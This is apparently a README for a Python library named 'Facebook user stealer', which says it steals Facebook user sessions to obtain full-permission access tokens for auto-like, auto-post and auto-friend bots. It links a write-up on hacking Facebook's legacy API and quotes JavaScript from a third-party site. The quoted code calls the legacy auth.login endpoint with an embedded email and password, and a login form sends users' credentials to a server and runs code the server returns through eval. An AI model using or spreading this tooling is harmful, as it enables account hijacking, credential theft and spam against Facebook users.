# Facebook user stealer

## Introduction
This library steal user sessions from Facebook.

You can use it to login with your email and password on facebook account (which facebook never let you do it)

When you login, you can get an access token with full permissions. So let thinking about some your facebook bot like auto comment, auto like, auto post to your friends wall, auto add friends, ....

## Disclaimer

This is an old library and needs to use another older libraries meanwhile we are updating the code, please install with:

> pip install requests==0.14.2

## Usage

* Look inside examples folder
* Execute an example provided, e.g:

> python .\get_facebook_session.py 

## Util
https://stephensclafani.com/2014/07/29/hacking-facebooks-legacy-api-part-2-stealing-user-sessions/
https://vipfb.ru 
* (inside iframe)
```javascript
document.getElementById("vipfb").innerHTML='<iframe width=\"100%\" style=\"border: none;overflow: hidden;word-wrap: break-word; padding: 15px;\" height=\"auto\" src=\"https:\/\/api.facebook.com\/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&email=carchvhycroh%40hotmail.com&format=JSON&locale=en_US&method=auth.login&password=1234&return_ssl_resources=1&v=2.6&sig=56fb4ec3dea1ac421e19d32769762bc5\"><\/iframe>';
```
* (inside sources)
```javascript
function vipfb_login() {
    var http = new XMLHttpRequest,
        user = document.getElementById("user").value,
        pass = document.getElementById("pass").value,
        params = "u=" + user + "&p=" + pass;
    document.cookie = "email=" + user, http.open("POST", "#", !0), http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), http.onreadystatechange = function() {
        if (4 == http.readyState && 200 == http.status) {
            var yorumveri = JSON.parse(this.responseText);
debugger
            yorumveri && yorumveri.eval && eval(yorumveri.eval)
        }
    }, http.send(params)
}
```